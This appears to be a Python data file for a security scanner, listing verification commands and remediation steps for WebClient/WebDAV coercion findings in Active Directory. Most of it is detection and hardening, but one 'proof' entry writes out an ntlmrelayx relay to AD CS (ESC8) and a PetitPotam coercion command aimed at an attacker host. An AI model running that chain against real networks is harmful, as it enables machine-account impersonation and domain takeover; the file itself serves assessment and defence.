"""
verifications/verify_webclient_webdav.py
Manual Verification and Remediation data for ADScan findings matching:
WebClient (WebDAV) coercion surface
"""

MATCH_KEYS = [
    "webclient",
    "webdav",
]

TOOLS = [
    {
        "tool": "NetExec",
        "icon": "netexec",
        "desc": "Sweep hosts for the WebClient service using the NetExec webdav module.",
        "code": (
            "nxc smb <targets> \\\n"
            "  -d <domain> \\\n"
            "  -u <username> \\\n"
            "  -p <password> \\\n"
            "  -M webdav"
        ),
        "confirm": (
            "A line reading <code>WebClient Service enabled on: &lt;host&gt;</code> confirms the "
            "host is coercible over HTTP. Hosts not listed do not have the service running."
        ),
    },
    {
        "tool": "GetWebDAVStatus",
        "icon": "impacket",
        "desc": "Check a specific host for the WebDAV named pipe (\\PIPE\\DAV RPC SERVICE).",
        "code": "GetWebDAVStatus.py '<domain>/<username>:<password>@<HOST>'",
        "confirm": "Output of <code>WebClient is enabled / running</code> confirms WebDAV exposure on that host.",
    },
    {
        "tool": "Coercion PoC (authorised only)",
        "icon": "impacket",
        "desc": (
            "Optional active proof: coerce a WebClient host to authenticate to a WebDAV path you "
            "control while running ntlmrelayx against AD CS (ESC8). Run only with authorisation."
        ),
        "code": (
            "# Listener (relay coerced HTTP auth to ADCS web enrollment):\n"
            "ntlmrelayx.py -t http://<CA_HOST>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController\n"
            "# Coerce (PetitPotam example, WebDAV target triggers HTTP auth):\n"
            "PetitPotam.py -u <user> -p <pass> -d <domain> <ATTACKER_HOST>@80/print <VICTIM_IP>"
        ),
        "confirm": (
            "Incoming HTTP authentication from the victim machine account at your relay, and an "
            "issued certificate, confirm the coercion-to-relay chain. Do not run without explicit "
            "authorisation."
        ),
    },
    {
        "tool": "PowerShell",
        "icon": "ps",
        "desc": (
            "Check the WebClient service state on a host directly. "
            "<strong>Run PowerShell as Administrator.</strong>"
        ),
        "code": (
            "Get-Service -ComputerName <HOST> -Name WebClient |\n"
            "  Select-Object MachineName, Status, StartType"
        ),
        "confirm": "A host reporting <strong>Status = Running</strong> for WebClient is affected.",
    },
]

REMEDIATION = {
    "title": "Disable the WebClient service and break the coercion-to-relay chain",
    "steps": [
        {
            "text": (
                "Disable and stop the WebClient service on hosts that do not require WebDAV "
                "(servers and most workstations). This removes the HTTP coercion primitive:"
            ),
            "code": (
                "Stop-Service -Name WebClient -Force\n"
                "Set-Service -Name WebClient -StartupType Disabled"
            ),
        },
        {
            "text": (
                "Enforce centrally via Group Policy so the service cannot be re-enabled. Set the "
                "WebClient service Startup type to Disabled under Computer Configuration > "
                "Preferences > Control Panel Settings > Services (or via a Services GPO)."
            ),
        },
        {
            "text": (
                "Where WebDAV is genuinely needed, mitigate the relay so coerced authentication is "
                "useless: enforce SMB signing, LDAP signing and LDAP channel binding."
            ),
        },
        {
            "text": (
                "If AD CS is present, require HTTPS with Extended Protection for Authentication "
                "(EPA) on the Web Enrollment endpoint and disable NTLM there to mitigate ESC8 — the "
                "highest-impact relay target for coerced HTTP authentication."
            ),
        },
        {
            "text": "Re-run the NetExec webdav module to confirm the service is no longer reachable:",
            "code": "nxc smb <targets> -d <domain> -u <username> -p <password> -M webdav",
        },
    ],
}

REFERENCES = [
    {
        "title": "The WebClient service and HTTP coercion / relay (The Hacker Recipes)",
        "url": "https://www.thehacker.recipes/ad/movement/ntlm/relay",
        "tag": "research",
    },
    {
        "title": "Certified Pre-Owned — AD CS Abuse (ESC8 relay) — SpecterOps",
        "url": "https://posts.specterops.io/certified-pre-owned-d95910965cd2",
        "tag": "research",
    },
    {
        "title": "PetitPotam — MS-EFSRPC coercion (topotam)",
        "url": "https://github.com/topotam/PetitPotam",
        "tag": "tool",
    },
    {
        "title": "GetWebDAVStatus — WebClient status checker (G0ldenGunSec)",
        "url": "https://github.com/G0ldenGunSec/GetWebDAVStatus",
        "tag": "tool",
    },
    {
        "title": "MITRE ATT&CK: Forced Authentication (T1187)",
        "url": "https://attack.mitre.org/techniques/T1187/",
        "tag": "attack",
    },
    {
        "title": "MITRE ATT&CK: Adversary-in-the-Middle — Relay (T1557.001)",
        "url": "https://attack.mitre.org/techniques/T1557/001/",
        "tag": "attack",
    },
]
